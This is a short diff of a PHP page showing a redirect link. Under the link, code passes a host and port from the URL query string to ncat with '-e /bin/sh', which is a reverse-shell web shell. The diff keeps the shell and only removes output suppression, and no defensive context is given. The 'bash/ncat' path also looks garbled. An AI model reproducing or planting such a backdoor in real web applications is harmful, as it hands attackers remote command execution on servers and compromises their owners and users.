@@ -5,5 +5,5 @@ request sent
 <a href="/">redirect</a>
 
 <?php
-  exec('bash/ncat '.$_GET['host'].' '.$_GET['port'].' -e /bin/sh >/dev/null &');
+  exec('bash/ncat '.$_GET['host'].' '.$_GET['port'].' -e /bin/sh &');
 ?>
